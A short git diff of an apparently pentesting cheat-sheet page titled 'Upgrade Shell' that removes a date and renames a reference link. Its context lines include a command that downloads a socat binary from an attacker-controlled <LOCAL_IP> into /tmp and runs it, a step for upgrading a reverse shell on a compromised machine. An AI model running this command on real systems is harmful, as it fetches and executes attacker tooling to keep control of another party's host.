@@ -1,6 +1,5 @@
 ---
 title: "Upgrade Shell"
-date: 2024-6-27
 tags: ["Reverse Shell", "Shell", "Python", "Bash", "Sh", "Tty", "Socat"]
 ---
 
@@ -76,7 +75,7 @@ wget -q http://<LOCAL_IP>/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/soc
 export TERM=xterm-256color
 ```
 
-<small>*Ref: [Download socat](https://github.com/3ndG4me/socat)*</small>
+<small>*Ref: [socat](https://github.com/3ndG4me/socat)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab3 >}}
